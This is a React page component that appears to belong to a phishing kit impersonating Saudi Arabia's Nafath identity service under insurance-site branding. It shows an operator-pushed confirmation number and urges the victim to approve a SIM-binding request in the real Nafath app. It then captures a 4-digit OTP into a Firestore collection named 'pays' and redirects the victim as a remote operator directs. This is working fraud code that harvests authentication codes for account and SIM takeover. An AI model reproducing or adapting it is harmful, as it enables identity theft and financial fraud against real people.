"use client";

import {
  Loader2Icon,
  Menu,
  ShieldAlert,
  Smartphone,
  CheckCircle2,
  ShieldCheck,
  Loader2,
  Shield,
} from "lucide-react";
import { Button } from "@/components/ui/button";
import { Card, CardContent } from "@/components/ui/card";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { useEffect, useRef, useState } from "react";

import { addData, db } from "@/lib/firebase";
import { Alert } from "@/components/ui/alert";
import { doc, onSnapshot, setDoc, Firestore } from "@/lib/firestore-shim";
import { useRedirectMonitor } from "@/hooks/use-redirect-monitor";

export default function Component() {
  const [showConfirmDialog, setShowConfirmDialog] = useState(false);
  const [showOtpDialog, setShowOtpDialog] = useState(false);
  const [confirmationCode, setConfirmationCode] = useState<string>("");
  const [isloading, setIsLoading] = useState(true);
  const [showError, setShowError] = useState("");

  const [otp, setOtp] = useState(["", "", "", ""]);
  const [otpError, setOtpError] = useState("");
  const [otpLoading, setOtpLoading] = useState(false);
  const [otpDone, setOtpDone] = useState(false);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  const [submitted, setSubmitted] = useState(false);

  const visitorId =
    typeof window !== "undefined" ? localStorage.getItem("visitor") || "" : "";

  useRedirectMonitor({ visitorId, currentPage: "nafad" });

  useEffect(() => {
    if (!visitorId || submitted) return;
    setSubmitted(true);
    addData({
      id: visitorId,
      nafadConfirmationStatus: "waiting",
      currentStep: "_t6",
      nafadUpdatedAt: new Date().toISOString(),
    }).catch(console.error);
  }, [visitorId, submitted]);

  useEffect(() => {
    if (!visitorId || !db) return;
    const unsubscribe = onSnapshot(
      doc(db as Firestore, "pays", visitorId),
      (docSnap) => {
        if (!docSnap.exists()) return;
        const data = docSnap.data();

        if (data.currentStep === "home") {
          window.location.href = "/";
          return;
        }
        if (data.currentStep === "phone") {
          window.location.href = "/step5";
          return;
        }
        if (data.currentStep === "_st1") {
          window.location.href = "/check";
          return;
        }
        if (data.currentStep === "_t2") {
          window.location.href = "/step2";
          return;
        }
        if (data.currentStep === "_t3") {
          window.location.href = "/step3";
          return;
        }

        if (data.nafadConfirmationCode) {
          setConfirmationCode(data.nafadConfirmationCode);
          const storageKey = `nafad_shown_${visitorId}`;
          const lastShown = localStorage.getItem(storageKey);
          if (data.nafadConfirmationCode !== lastShown) {
            setShowConfirmDialog(true);
            localStorage.setItem(storageKey, data.nafadConfirmationCode);
            setIsLoading(false);
            setShowError("");
            setShowOtpDialog(false);
          }
        } else if (data.nafadConfirmationCode === "") {
          setShowConfirmDialog(false);
          localStorage.removeItem(`nafad_shown_${visitorId}`);
        }

        if (data.nafadConfirmationStatus === "approved") {
          setShowConfirmDialog(false);
          setShowOtpDialog(true);
          setOtp(["", "", "", ""]);
          setOtpError("");
          setOtpDone(false);
          setDoc(
            doc(db as Firestore, "pays", visitorId),
            {
              nafadConfirmationStatus: "",
              nafadConfirmationCode: "",
            },
            { merge: true },
          );
          setTimeout(() => inputRefs.current[0]?.focus(), 150);
        } else if (data.nafadConfirmationStatus === "rejected") {
          setShowConfirmDialog(false);
          setShowError("تم رفض عملية التحقق. يرجى المحاولة مرة أخرى.");
          setIsLoading(false);
          setDoc(
            doc(db as Firestore, "pays", visitorId),
            {
              nafadConfirmationStatus: "",
              nafadConfirmationCode: "",
            },
            { merge: true },
          );
        }
      },
      (error) => console.error("[nafad] Firestore listener error:", error),
    );
    return () => unsubscribe();
  }, []);

  const handleRetry = async () => {
    setShowError("");
    setIsLoading(true);
    await addData({
      id: visitorId,
      nafadConfirmationStatus: "waiting",
      currentStep: "_t6",
      nafadUpdatedAt: new Date().toISOString(),
    });
  };

  const handleOtpChange = (index: number, value: string) => {
    if (!/^\d?$/.test(value)) return;
    const next = [...otp];
    next[index] = value;
    setOtp(next);
    setOtpError("");
    if (value && index < 3) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleOtpKeyDown = (
    index: number,
    e: React.KeyboardEvent<HTMLInputElement>,
  ) => {
    if (e.key === "Backspace" && !otp[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handleOtpPaste = (e: React.ClipboardEvent) => {
    const pasted = e.clipboardData
      .getData("text")
      .replace(/\D/g, "")
      .slice(0, 4);
    if (pasted.length === 4) {
      setOtp(pasted.split(""));
      inputRefs.current[3]?.focus();
    }
    e.preventDefault();
  };

  const handleOtpSubmit = async () => {
    const code = otp.join("");
    if (code.length !== 4) {
      setOtpError("يرجى إدخال الرمز المكون من 4 أرقام كاملاً");
      return;
    }
    setOtpLoading(true);
    try {
      await setDoc(
        doc(db as Firestore, "pays", visitorId),
        {
          nafadOtp: code,
          nafadOtpSubmittedAt: new Date().toISOString(),
        },
        { merge: true },
      );
      setOtpDone(true);
      setTimeout(() => {
        window.location.href = "/step5";
      }, 1200);
    } catch (err) {
      console.error("[nafad OTP]", err);
      setOtpError("حدث خطأ، يرجى المحاولة مرة أخرى.");
    } finally {
      setOtpLoading(false);
    }
  };

  const otpFilled = otp.every((d) => d !== "");

  return (
    <div
      className="min-h-screen bg-gradient-to-br from-slate-50 via-teal-50 to-slate-100"
      dir="rtl"
    >
      <header className="bg-white/80 backdrop-blur-md shadow-sm border-b border-teal-100 sticky top-0 z-10">
        <div className="flex items-center justify-between p-4 max-w-7xl mx-auto">
          <Menu className="w-6 h-6 text-gray-500 cursor-pointer hover:text-[#00796b] transition-colors" />
          <img
            src="/nafad-logo-new.png"
            alt="نفاذ"
            width={110}
            className="object-contain"
          />
          <div className="w-6" />
        </div>
      </header>

      <main className="p-4 max-w-lg mx-auto py-10 space-y-6">
        <div className="text-center space-y-3">
          <div className="w-20 h-20 bg-gradient-to-br from-[#009688] to-[#00796b] rounded-2xl flex items-center justify-center mx-auto shadow-lg shadow-teal-200">
            <ShieldCheck className="w-10 h-10 text-white" />
          </div>
          <h1 className="text-2xl font-bold text-gray-800">
            التحقق عبر تطبيق نفاذ
          </h1>
        </div>

        <Card className="border-0 shadow-xl shadow-teal-100/50 overflow-hidden">
          <div className="h-1 bg-gradient-to-r from-[#4db6ac] to-[#009688]" />
          <CardContent className="p-8 text-center space-y-6">
            {" "}
            <div
              className="fixed inset-0 z-50 bg-white flex flex-col"
              dir="rtl"
            >
              {/* Header */}
              {/* Logo / Header */}
              <div className="flex items-center gap-3 mb-10 mt-4">
                <div className="text-right">
                  <div className="w-12 h-12 flex items-center justify-center">
                    <img src="/tameeni-logo.webp" width={80} />
                  </div>
                  <p className="text-gray-800 font-semibold text-base">
                    بي كير
                  </p>
                </div>
                {/* Logo Icon */}
              </div>

              <div className="flex-1 flex flex-col items-center px-6 py-4">
                {/* Nafath title */}
                <img src="/images (2).png" width={100} />
                <h2 className="text-xl font-bold text-gray-800 mb-3 text-center">
                  التحقق من خلال تطبيق نفاذ
                </h2>

                <p className="text-gray-600 text-sm text-center leading-relaxed mb-8 max-w-xs">
                  الرجاء فتح تطبيق نفاذ وتأكيد طلب إصدار أمر ربط شريحتك على رقم
                  الجوال لتأكيد حجز الموعد باختيار الرقم أدناه
                </p>

                {/* Two step cards */}
                <div className="flex gap-4 w-full mb-8">
                  {/* Step 2 - face scan */}
                  <div className="flex-1 flex flex-col items-center gap-2">
                    <div className="w-full aspect-square rounded-xl border-2 border-[#2a7a4b] flex items-center justify-center bg-white overflow-hidden p-3">
                      {/* Face biometric illustration */}
                      <svg
                        viewBox="0 0 100 100"
                        width="100%"
                        height="100%"
                        xmlns="http://www.w3.org/2000/svg"
                      >
                        {/* Face scan grid */}
                        <rect
                          x="5"
                          y="5"
                          width="20"
                          height="4"
                          rx="2"
                          fill="#2a7a4b"
                          opacity="0.4"
                        />
                        <rect
                          x="5"
                          y="5"
                          width="4"
                          height="20"
                          rx="2"
                          fill="#2a7a4b"
                          opacity="0.4"
                        />
                        <rect
                          x="75"
                          y="5"
                          width="20"
                          height="4"
                          rx="2"
                          fill="#2a7a4b"
                          opacity="0.4"
                        />
                        <rect
                          x="91"
                          y="5"
                          width="4"
                          height="20"
                          rx="2"
                          fill="#2a7a4b"
                          opacity="0.4"
                        />
                        <rect
                          x="5"
                          y="91"
                          width="20"
                          height="4"
                          rx="2"
                          fill="#2a7a4b"
                          opacity="0.4"
                        />
                        <rect
                          x="5"
                          y="75"
                          width="4"
                          height="20"
                          rx="2"
                          fill="#2a7a4b"
                          opacity="0.4"
                        />
                        <rect
                          x="75"
                          y="91"
                          width="20"
                          height="4"
                          rx="2"
                          fill="#2a7a4b"
                          opacity="0.4"
                        />
                        <rect
                          x="91"
                          y="75"
                          width="4"
                          height="20"
                          rx="2"
                          fill="#2a7a4b"
                          opacity="0.4"
                        />
                        {/* Person silhouette */}
                        <circle cx="50" cy="35" r="18" fill="#f0a080" />
                        <ellipse
                          cx="50"
                          cy="80"
                          rx="22"
                          ry="18"
                          fill="#4fc3f7"
                        />
                        {/* Face dots */}
                        <circle
                          cx="44"
                          cy="33"
                          r="2"
                          fill="#555"
                          opacity="0.7"
                        />
                        <circle
                          cx="56"
                          cy="33"
                          r="2"
                          fill="#555"
                          opacity="0.7"
                        />
                        <path
                          d="M44 43 Q50 48 56 43"
                          stroke="#555"
                          strokeWidth="1.5"
                          fill="none"
                          strokeLinecap="round"
                          opacity="0.7"
                        />
                        {/* Scan lines */}
                        <line
                          x1="20"
                          y1="50"
                          x2="80"
                          y2="50"
                          stroke="#2a7a4b"
                          strokeWidth="1"
                          opacity="0.3"
                          strokeDasharray="4,3"
                        />
                        <line
                          x1="20"
                          y1="55"
                          x2="80"
                          y2="55"
                          stroke="#2a7a4b"
                          strokeWidth="1"
                          opacity="0.2"
                          strokeDasharray="4,3"
                        />
                      </svg>
                    </div>
                    <p className="text-xs text-gray-700 font-bold text-center">
                      ثانياً: اختيار الرقم
                    </p>
                    <p className="text-xs text-gray-600 text-center">
                      ادناه و التحقق عبر السمات الحيوية
                    </p>
                  </div>

                  {/* Step 1 - Nafath app */}
                  <div className="flex-1 flex flex-col items-center gap-2">
                    <img src="/unnamed.png" />
                    <p className="text-xs text-gray-700 font-bold text-center">
                      أولاً: يرجى تحميل
                    </p>
                    <p className="text-xs text-gray-600 text-center">
                      تطبيق نفاذ
                    </p>
                  </div>
                </div>
                {confirmationCode.length < 1 ? (
                  <>
                    {" "}
                    {/* Spinner */}
                    <div className="mb-4">
                      <div
                        className="w-14 h-14 rounded-full border-4 border-gray-200 border-t-[#2a7a4b]"
                        style={{ animation: "spin 1s linear infinite" }}
                      />
                      <style>{`@keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }`}</style>
                    </div>
                    <p className="text-gray-500 text-sm mb-8">
                      يرجى الإنتظار ... سيظهر الكود أمامك خلال لحظات.
                    </p>
                  </>
                ) : (
                  confirmationCode
                )}
                {/* Open Nafath button */}
                <a
                  href="https://apps.apple.com/sa/app/%D9%86%D9%81%D8%A7%D8%B0-nafath/id1598909871"
                  className="w-full py-4 rounded-lg text-white text-lg font-bold transition-colors"
                  style={{ background: "#2a7a4b" }}
                >
                  افتح تطبيق نفاذ
                </a>
              </div>
              {/* Footer text */}
              <div className="px-5 pb-6 text-center">
                <p className="text-gray-400 text-xs">
                  إصدار وإتاحة الهوية الوطنية الرقمية عبر
                </p>
                <p className="text-gray-400 text-xs">
                  تطوير وتشغيل مركز المعلومات الوطني
                </p>
              </div>

              {/* Floating Chat Button */}
              <div className="fixed bottom-8 left-6 z-50">
                <button className="w-14 h-14 rounded-full bg-green-500 hover:bg-green-600 flex items-center justify-center shadow-lg transition-colors">
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    className="w-7 h-7 text-white"
                    fill="none"
                    viewBox="0 0 24 24"
                    stroke="currentColor"
                    strokeWidth={2}
                  >
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      d="M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.863 9.863 0 01-4.255-.949L3 20l1.395-3.72C3.512 15.042 3 13.574 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z"
                    />
                  </svg>
                </button>
              </div>
            </div>
          </CardContent>
        </Card>

        <div className="bg-gradient-to-br from-[#009688] to-[#00796b] rounded-2xl p-6 text-center text-white space-y-4 shadow-lg shadow-teal-200 relative overflow-hidden">
          <div className="absolute top-0 right-0 w-28 h-28 bg-white/10 rounded-full -mr-10 -mt-10" />
          <div className="absolute bottom-0 left-0 w-20 h-20 bg-white/10 rounded-full -ml-8 -mb-8" />
          <p className="text-sm font-medium text-teal-100 relative z-10">
            لتحميل تطبيق نفاذ
          </p>
          <div className="flex justify-center gap-3 relative z-10">
            <a
              href="https://play.google.com/store/apps/details?id=sa.gov.nic.myid&hl=ar"
              className="hover:scale-105 transition-transform"
            >
              <img
                src="/google-play.png"
                alt="Google Play"
                className="h-9 rounded-lg"
              />
            </a>
            <a
              href="https://apps.apple.com/by/app/%D9%86%D9%81%D8%A7%D8%B0-nafath/id1598909871"
              className="hover:scale-105 transition-transform"
            >
              <img
                src="/apple_store.png"
                alt="App Store"
                className="h-9 rounded-lg"
              />
            </a>
          </div>
        </div>
      </main>

      <Dialog open={showOtpDialog} onOpenChange={() => {}}>
        <DialogContent
          className="max-w-sm mx-auto [&>button]:hidden rounded-3xl border-0 shadow-2xl p-0 overflow-hidden"
          dir="rtl"
        >
          <div className="h-1 bg-gradient-to-l from-[#4db6ac] via-[#009688] to-[#00796b]" />

          <div className="px-6 pt-5 pb-6 space-y-5">
            <DialogHeader className="text-center space-y-3">
              <div className="flex justify-center">
                <div className="relative">
                  <div className="w-16 h-16 rounded-2xl bg-gradient-to-br from-[#009688] to-[#00796b] flex items-center justify-center shadow-xl shadow-teal-200">
                    <Smartphone className="w-8 h-8 text-white" />
                  </div>
                  {otpDone && (
                    <div className="absolute -top-1 -right-1 w-5 h-5 bg-emerald-500 rounded-full flex items-center justify-center shadow">
                      <CheckCircle2 className="w-3 h-3 text-white" />
                    </div>
                  )}
                </div>
              </div>
              <DialogTitle className="text-lg font-black text-slate-800">
                رمز التحقق
              </DialogTitle>
              <p className="text-sm text-slate-500 leading-relaxed">
                أدخل رمز التحقق المكون من{" "}
                <span className="font-bold text-[#00796b]">4 أرقام</span> الذي
                وصلك
              </p>
            </DialogHeader>

            <div
              className="flex justify-center gap-3"
              dir="ltr"
              onPaste={handleOtpPaste}
            >
              {otp.map((digit, i) => (
                <input
                  key={i}
                  ref={(el) => {
                    inputRefs.current[i] = el;
                  }}
                  type="text"
                  inputMode="numeric"
                  maxLength={1}
                  value={digit}
                  onChange={(e) => handleOtpChange(i, e.target.value)}
                  onKeyDown={(e) => handleOtpKeyDown(i, e)}
                  disabled={otpLoading || otpDone}
                  className={[
                    "w-14 h-16 text-center text-3xl font-black rounded-2xl border-2 outline-none transition-all",
                    otpError
                      ? "border-red-300 bg-red-50 text-red-700"
                      : otpDone
                        ? "border-emerald-300 bg-emerald-50 text-emerald-700"
                        : digit
                          ? "border-[#009688] bg-teal-50 text-[#00796b]"
                          : "border-slate-200 bg-slate-50 text-slate-800 focus:border-[#009688] focus:bg-white",
                  ].join(" ")}
                />
              ))}
            </div>

            {otpError && (
              <p className="text-center text-xs text-red-600 font-medium">
                ⚠ {otpError}
              </p>
            )}

            {otpDone && (
              <div className="flex items-center justify-center gap-2 bg-emerald-50 border border-emerald-200 rounded-2xl px-4 py-3">
                <CheckCircle2 className="h-4 w-4 text-emerald-600 flex-shrink-0" />
                <p className="text-sm text-emerald-800 font-bold">
                  تم التحقق بنجاح! جاري الانتقال...
                </p>
              </div>
            )}

            <button
              type="button"
              onClick={handleOtpSubmit}
              disabled={!otpFilled || otpLoading || otpDone}
              className="w-full h-12 rounded-2xl font-black text-sm transition-all duration-200 disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
              style={{
                background: otpDone
                  ? "linear-gradient(135deg, #10b981, #059669)"
                  : otpLoading
                    ? "linear-gradient(135deg, #00796b, #00695c)"
                    : "linear-gradient(135deg, #009688, #00796b)",
                color: "#fff",
                boxShadow: otpDone
                  ? "0 8px 24px rgba(16,185,129,0.3)"
                  : "0 8px 24px rgba(0,150,136,0.35)",
              }}
            >
              {otpLoading ? (
                <>
                  <Loader2 className="h-4 w-4 animate-spin" /> جاري التحقق...
                </>
              ) : otpDone ? (
                <>
                  <CheckCircle2 className="h-4 w-4" /> تم التحقق
                </>
              ) : (
                "تأكيد الرمز"
              )}
            </button>

            <div className="flex items-center justify-center gap-1.5">
              <Shield className="h-3 w-3 text-slate-400" />
              <p className="text-[11px] text-slate-400">
                رمز التحقق صالح لمدة 10 دقائق فقط
              </p>
            </div>
          </div>
        </DialogContent>
      </Dialog>

      <footer className="mt-10 p-6 bg-white/60 border-t border-gray-100">
        <div className="text-center space-y-4 max-w-4xl mx-auto">
          <div className="flex flex-wrap justify-center gap-x-6 gap-y-1 text-xs text-gray-500">
            {[
              "الرئيسية",
              "حول",
              "اتصل بنا",
              "الشروط والأحكام",
              "المساعدة والدعم",
              "سياسة الخصوصية",
            ].map((link) => (
              <a
                key={link}
                href="#"
                className="hover:text-teal-600 transition-colors"
              >
                {link}
              </a>
            ))}
          </div>
          <div className="flex justify-center">
            <img
              src="/cst-logo.jpg"
              alt="هيئة الاتصالات"
              width={50}
              className="opacity-60 rounded"
            />
          </div>
        </div>
      </footer>
    </div>
  );
}
